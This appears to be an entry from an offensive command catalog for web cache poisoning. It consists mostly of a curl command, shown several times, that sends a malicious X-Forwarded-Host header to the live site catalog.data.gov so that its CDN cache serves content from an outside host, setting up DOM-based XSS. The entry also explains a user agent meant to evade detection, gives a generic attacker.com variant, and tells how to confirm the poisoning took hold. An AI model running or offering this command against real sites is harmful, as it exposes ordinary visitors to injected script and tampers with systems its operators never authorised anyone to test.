---
id: cmd-curl-poison-cache
data: >-
  curl -i -s -k -X 'GET' -H 'Host: catalog.data.gov' -H 'Accept-Encoding: gzip,
  deflate' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0
  (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H
  'x-forwarded-host: portswigger-labs.net/catalog.data.gov_json_xss/json.php?'
  -H 'Connection: close'
  'https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=6'
  > /dev/null
tags:
  - web-cache-poisoning
  - http-request
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:06:26.599Z'
verified: false
validated: true
submitted: true
---
# curl-poison-cloudfront-cache

## Command

```bash
curl -i -s -k -X 'GET' -H 'Host: catalog.data.gov' -H 'Accept-Encoding: gzip, deflate' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H 'x-forwarded-host: portswigger-labs.net/catalog.data.gov_json_xss/json.php?' -H 'Connection: close' 'https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=6' > /dev/null
```

## Description

This command uses curl to send a crafted GET request that poisons the CloudFront cache by setting a malicious X-Forwarded-Host header, leading to tainted response attributes for DOM-based XSS setup. Use it when targeting reverse proxies or CDNs that trust forwarded headers.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-i` | Include response headers in output | Yes |
| `-s` | Silent mode, suppress progress meter | Yes |
| `-k` | Allow insecure SSL connections, skip verification | Yes |
| `-X 'GET'` | Specify HTTP method as GET | Yes |
| `-H 'Host: catalog.data.gov'` | Set the Host header to the target domain | Yes |
| `-H 'Accept-Encoding: gzip, deflate'` | Specify accepted compression | Yes |
| `-H 'Accept: */*'` | Accept any content type | Yes |
| `-H 'Accept-Language: en'` | Set preferred language | Yes |
| `-H 'User-Agent: ...'` | Mimic IE9 browser to evade detection | Yes |
| `-H 'x-forwarded-host: ...'` | Malicious header to poison cache with attacker domain | Yes |
| `-H 'Connection: close'` | Close connection after request | Yes |
| URL | Target endpoint with query param to poison | Yes |
| `> /dev/null` | Suppress output | Yes |

## Examples

### Basic Usage

```bash
curl -i -s -k -X 'GET' -H 'Host: example.com' -H 'x-forwarded-host: attacker.com/evil' 'https://example.com/path' > /dev/null
```

### Advanced Usage

```bash
curl -i -s -k -X 'GET' -H 'Host: catalog.data.gov' -H 'Accept-Encoding: gzip, deflate' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H 'x-forwarded-host: portswigger-labs.net/catalog.data.gov_json_xss/json.php?' -H 'Connection: close' 'https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=6' > /dev/null
```

## Expected Output

No output due to redirection to /dev/null, but the request poisons the cache. Verify by sending a follow-up GET to the URL and checking response headers/body for tainted attributes.

## Related

- [[Related Procedure|procedures/Poison-CloudFront-Cache-with-Malicious-X-Forwarded-Host]]
